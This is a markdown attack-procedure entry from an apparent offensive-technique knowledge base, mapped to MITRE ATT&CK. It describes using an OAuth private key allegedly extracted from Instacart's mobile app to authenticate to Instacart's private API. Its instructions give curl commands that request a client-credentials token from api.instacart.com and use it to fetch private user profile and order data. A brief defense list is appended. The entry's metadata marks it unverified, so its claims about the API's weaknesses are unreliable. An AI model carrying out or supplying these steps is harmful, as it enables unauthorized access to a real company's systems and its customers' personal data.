---
tags:
  - oauth
  - api-abuse
  - unauthorized-access
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-oauth-auth]]'
verified: false
platforms:
  - Web
  - API
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:32:10.232Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: d406f83e-7e47-4367-a74b-a730a1d90d42
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Authenticate-to-Instacart-API-Using-Extracted-OAuth-Key

## Summary

This procedure uses the extracted hardcoded OAuth private key from Instacart's mobile app to authenticate directly to their private API endpoints, bypassing normal user authentication and enabling unrestricted data access or manipulation.

## Description

With the private key in hand, attackers can generate OAuth tokens or directly use the key in API requests to access sensitive endpoints. Instacart's API lacks additional protections against leaked client credentials, allowing full API abuse. This targets the OAuth 2.0 implementation in mobile-to-server communications, where the key acts as a client secret. Prerequisites include the extracted key; outcomes involve successful queries to private resources like user profiles or order data.

## Requirements

1. Extracted OAuth private key from decompiled app.
2. Network access to https://api.instacart.com.
3. curl or similar HTTP client installed.
4. Knowledge of Instacart API endpoints (discoverable via app traffic or docs).

## Defense

Defensive measures and detection strategies:

- Rotate keys immediately upon disclosure and implement short-lived tokens.
- Use asymmetric cryptography with public keys only in clients; keep private keys server-side.
- Log and alert on API requests from unexpected client IDs or high-volume access.
- Enforce IP whitelisting or device fingerprinting for API calls.

## Objectives

1. Authenticate using the leaked private key to obtain an access token.
2. Access restricted API endpoints for unauthorized data retrieval.
3. Exploit the lack of key validation in client-side OAuth flows.

## Instructions

### Step 1: Generate OAuth Token

**Context**: Use the private key to request an access token from the OAuth endpoint, simulating client credentials flow.

**Command** ([[commands/curl-oauth-auth]]):
```bash
curl -X POST https://api.instacart.com/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=client_credentials&client_id=EXTRACTED_CLIENT_ID&client_secret=EXTRACTED_PRIVATE_KEY"
```

> Expected output: JSON response with "access_token" field. If successful, the token grants full API permissions.

### Step 2: Access Private API Endpoint

**Context**: Use the token to query a private endpoint, such as fetching user data, to confirm unrestricted access.

**Command** (curl with token):
```bash
curl -H "Authorization: Bearer ACCESS_TOKEN" https://api.instacart.com/v2/users/me
```

> Expected output: Private user data (e.g., orders, profile). Success indicates the key enables account takeover-like access.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques

- N/A

## Commands Used

- [[commands/curl-oauth-auth]]

## Tools Used

- N/A

## Tags

- oauth
- api-abuse
- unauthorized-access
- credential-reuse
